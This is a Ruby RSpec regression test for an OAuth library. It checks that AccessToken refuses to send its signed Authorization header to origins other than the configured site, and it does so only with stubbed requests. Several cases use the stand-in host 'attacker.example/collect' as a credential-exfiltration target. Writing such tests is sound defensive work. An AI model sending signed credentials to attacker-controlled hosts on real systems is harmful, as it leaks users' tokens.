# frozen_string_literal: true

require "oauth/tokens/access_token"
require "oauth/consumer"

# Regression coverage for sending the signed OAuth Authorization header to an
# origin other than the configured :site (CWE-918). AccessToken#request must
# refuse a cross-origin absolute URI unless the consumer opts in.
RSpec.describe OAuth::AccessToken do
  let(:consumer) { OAuth::Consumer.new("ckey", "csecret", site: "https://provider.example", **extra_options) }
  let(:extra_options) { {} }
  let(:token) { described_class.new(consumer, "token", "token_secret") }

  # Stop before the network: raise from Consumer#request so we only assert which
  # URI the request would have been sent to, never actually send one.
  before do
    allow(consumer).to receive(:request).and_raise(StandardError, "network reached: #{consumer.uri}")
  end

  context "with the default configuration" do
    it "refuses a cross-origin absolute URI before any request is made" do
      expect { token.get("https://attacker.example/collect") }
        .to raise_error(OAuth::Error, /cross-origin/)
    end

    it "refuses a same-host, different-port absolute URI" do
      expect { token.get("https://provider.example:8443/api") }
        .to raise_error(OAuth::Error, /cross-origin/)
    end

    it "refuses a same-host, different-scheme absolute URI" do
      expect { token.get("http://provider.example/api") }
        .to raise_error(OAuth::Error, /cross-origin/)
    end

    it "allows a same-origin absolute URI (reaches the request layer)" do
      expect { token.get("https://provider.example/api/people") }
        .to raise_error(StandardError, /network reached/)
    end

    it "allows a relative path (reaches the request layer)" do
      expect { token.get("/api/people") }
        .to raise_error(StandardError, /network reached/)
    end

    it "restores consumer.uri after refusing" do
      expect { token.get("https://attacker.example/collect") }.to raise_error(OAuth::Error)
      expect(consumer.uri.to_s).to eq("https://provider.example")
    end
  end

  context "with access_token_cross_origin_requests enabled" do
    let(:extra_options) { { access_token_cross_origin_requests: true } }

    it "allows a cross-origin absolute URI (reaches the request layer)" do
      expect { token.get("https://attacker.example/collect") }
        .to raise_error(StandardError, /network reached/)
    end
  end
end
